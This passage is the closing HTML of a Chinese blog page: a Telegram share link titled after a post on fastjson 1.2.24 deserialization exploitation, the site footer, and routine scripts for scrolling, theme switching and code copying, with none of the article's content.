<a target=_blank rel="noopener noreferrer" aria-label="share Java 反序列化漏洞原理（三）fastjson 1.2.24 Templateslmpl 利用原理 on telegram" href="https://telegram.me/share/url?text=Java%20%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e6%bc%8f%e6%b4%9e%e5%8e%9f%e7%90%86%ef%bc%88%e4%b8%89%ef%bc%89fastjson%201.2.24%20Templateslmpl%20%e5%88%a9%e7%94%a8%e5%8e%9f%e7%90%86&url=https%3a%2f%2ftypesafe.cn%2fposts%2fjava-serialization-vulnerability-3%2f"><svg viewBox="2 2 28 28"><path d="M26.49 29.86H5.5a3.37 3.37.0 01-2.47-1 3.35 3.35.0 01-1-2.47V5.48A3.36 3.36.0 013 3 3.37 3.37.0 015.5 2h21A3.38 3.38.0 0129 3a3.36 3.36.0 011 2.46V26.37a3.35 3.35.0 01-1 2.47 3.38 3.38.0 01-2.51 1.02zm-5.38-6.71a.79.79.0 00.85-.66L24.73 9.24a.55.55.0 00-.18-.46.62.62.0 00-.41-.17q-.08.0-16.53 6.11a.59.59.0 00-.41.59.57.57.0 00.43.52l4 1.24 1.61 4.83a.62.62.0 00.63.43.56.56.0 00.4-.17L16.54 20l4.09 3A.9.9.0 0021.11 23.15zM13.8 20.71l-1.21-4q8.72-5.55 8.78-5.55c.15.0.23.0.23.16a.18.18.0 010 .06s-2.51 2.3-7.52 6.8z"/></svg>
</a>
</div></footer></article></main><footer class=footer>
<span>&copy; 2022 <a href=https://typesafe.cn>没有理想的人不伤心</a></span>
<span>
Powered by
<a href=https://gohugo.io/ rel="noopener noreferrer" target=_blank>Hugo</a> &
        <a href=https://git.io/hugopapermod rel=noopener target=_blank>PaperMod</a>
</span>
</footer><a href=#top aria-label="go to top" title="Go to Top (Alt + G)" class=top-link id=top-link accesskey=g><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 12 6" fill="currentcolor"><path d="M12 6H0l6-6z"/></svg>
</a>
<script>let menu=document.getElementById("menu");menu&&(menu.scrollLeft=localStorage.getItem("menu-scroll-position"),menu.onscroll=function(){localStorage.setItem("menu-scroll-position",menu.scrollLeft)}),document.querySelectorAll('a[href^="#"]').forEach(e=>{e.addEventListener("click",function(t){t.preventDefault();var e=this.getAttribute("href").substr(1);window.matchMedia("(prefers-reduced-motion: reduce)").matches?document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView():document.querySelector(`[id='${decodeURIComponent(e)}']`).scrollIntoView({behavior:"smooth"}),e==="top"?history.replaceState(null,null," "):history.pushState(null,null,`#${e}`)})})</script>
<script>var mybutton=document.getElementById("top-link");window.onscroll=function(){document.body.scrollTop>800||document.documentElement.scrollTop>800?(mybutton.style.visibility="visible",mybutton.style.opacity="1"):(mybutton.style.visibility="hidden",mybutton.style.opacity="0")}</script>
<script>document.getElementById("theme-toggle").addEventListener("click",()=>{document.body.className.includes("dark")?(document.body.classList.remove("dark"),localStorage.setItem("pref-theme","light")):(document.body.classList.add("dark"),localStorage.setItem("pref-theme","dark"))})</script>
<script>document.querySelectorAll("pre > code").forEach(t=>{const n=t.parentNode.parentNode,e=document.createElement("button");e.classList.add("copy-code"),e.innerText="复制";function s(){e.innerText="已复制！",setTimeout(()=>{e.innerText="复制"},2e3)}e.addEventListener("click",o=>{if("clipboard"in navigator){navigator.clipboard.writeText(t.textContent),s();return}const e=document.createRange();e.selectNodeContents(t);const n=window.getSelection();n.removeAllRanges(),n.addRange(e);try{document.execCommand("copy"),s()}catch(e){}n.removeRange(e)}),n.classList.contains("highlight")?n.appendChild(e):n.parentNode.firstChild==n||(t.parentNode.parentNode.parentNode.parentNode.parentNode.nodeName=="TABLE"?t.parentNode.parentNode.parentNode.parentNode.parentNode.appendChild(e):t.parentNode.appendChild(e))})</script>
</body></html>